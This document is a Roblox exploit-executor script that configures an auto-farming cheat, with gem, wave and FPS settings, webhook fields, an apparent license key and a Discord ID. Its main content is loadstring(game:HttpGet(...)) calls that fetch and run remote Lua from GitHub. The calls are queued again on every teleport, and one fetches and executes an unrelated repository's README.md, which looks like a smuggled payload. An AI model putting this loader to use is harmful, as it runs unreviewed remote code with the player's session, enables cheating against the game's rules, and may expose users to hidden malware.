_G.RoyxSpecialMode = "Hell Factory";
_G["External Config"] = {
    ["Kai Gems"] = true, -- true / false
    ["Kai Story"] = false, -- true / false
    ["Kai Battle Pass"] = false, -- true / false
    ["Kai Infinity Castle"] = false, -- true / false
    ["Auto Set Resource"] = true, -- true / false
    ["Select End Game Mode"] = "Instant Leave", -- "Instant Leave" / "Auto Sell"
    ["End Wave"] = 10, -- number
    ["Maximum Added Gems"] = 60000, -- number
    ["Close Roblox When Maximum Added Gems"] = false, -- true / false
    ["Using Limit Farming"] = true, -- true / false
    ["Stop Farming When The Limit Is Reached"] = false, -- true / false
    ["Send Webhook When The Limit Is Reached"] = false, -- true / false
    ["Webhook Url"] = "", -- string
    ["RAM Port"] = "7963", -- string
    ["RAM Password"] = "", -- string
    ["RAM Private Server Url"] = "", -- string
    ["RAM Auto Description"] = true, -- true / false
    ["RAM Auto Private Server"] = false, -- true / false
    ["RAM Auto Exit"] = false, -- true / false
    ["Fps Limit"] = 15, -- number
    ["Lock Fps"] = true, -- true / false
    ["Release Fps When Rejoin"] = false, -- true / false
    ["Select Unit"] = {"Slot 1", "Slot 2", "Slot 3"}, -- table  {"Slot 1", "Slot 2", "Slot 3", "Slot 4", "Slot 5", "Slot 6"}
};
_G.Key = "176F0-OVPVZ-CESIB"
_G.DiscordId = "645595262114594817"

local Key = _G.Key
local DiscordId = _G.DiscordId

queue_on_teleport(string.format([[

    _G.Key = "%s"
    _G.DiscordId = "%s"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Natsuhanaki/Royx_PC/main/loader.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/toohot123/Roblox1/main/README.md"))()
]], Key, DiscordId))

-- loadstring(game:HttpGet("https://raw.githubusercontent.com/Natsuhanaki/Royx_PC/main/loader.lua"))()

print("Executed!");
loadstring(game:HttpGet("https://raw.githubusercontent.com/Natsuhanaki/Royx_PC/main/loader.lua"))()
